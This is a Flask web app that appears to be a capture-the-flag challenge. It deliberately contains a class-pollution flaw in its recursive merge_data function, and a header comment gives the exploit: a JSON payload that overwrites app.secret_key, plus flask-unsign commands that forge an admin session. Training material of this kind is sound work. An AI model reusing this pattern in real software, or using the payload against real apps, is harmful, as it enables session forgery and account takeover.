import secrets
import string

from flask import Flask, session, redirect, url_for, request, Markup


# # Exploit
# {"__class__":{"__init__":{"__globals__":{"app":{"__class__":{"secret_key":"pupu"}}}}}}
# pip install flask-unsign
# flask-unsign -s -S pupu -c '{"username":"admin"}'


def gensec(n):
    return "".join((secrets.choice(string.ascii_letters) for _ in range(n)))


def merge_data(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, "__getitem__"):
            if dst.get(k) and type(v) == dict:
                merge_data(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge_data(v, getattr(dst, k))
        else:
            setattr(dst, k, v)


app = Flask(__name__)
app.secret_key = gensec(256)


class User:
    def __init__(self):
        pass


@app.route("/")
def index():
    if "username" in session:
        user = Markup(session["username"].lower())
        if user == "admin":
            return Markup("You got the flag")
        return f"<div>Logged in as {user}</div><div><a href=/logout>logout</a></div><div><a href=/add-user-data>check</a></div>"
    return redirect(url_for("login"))


@app.route("/add-user-data", methods=["POST"])
def add_user_data():
    json_req = request.json

    if json_req:
        app.logger.debug(app.secret_key)
        merge_data(
            json_req,
            User(),
        )
        app.logger.debug(app.secret_key)
        return "User updated"
    return "Missing user data"


@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        user = request.form["username"].lower()
        if user != "admin":
            session["username"] = user
        elif request.form.get("password", "") == gensec(
            64
        ):  # admin should send the password
            session["username"] = user
        else:
            session["username"] = "l4m3r"
        return redirect(url_for("index"))
    return """
        <form method="post">
            <p><input type=text name=username>
            <p><input type=text name=password> Required only for admin
            <p><input type=submit value=Login>
        </form>
    """


@app.route("/logout")
def logout():
    # remove the username from the session if it's there
    session.pop("username", None)
    return redirect(url_for("index"))


if __name__ == "__main__":
    app.run(port=8000, debug=True)
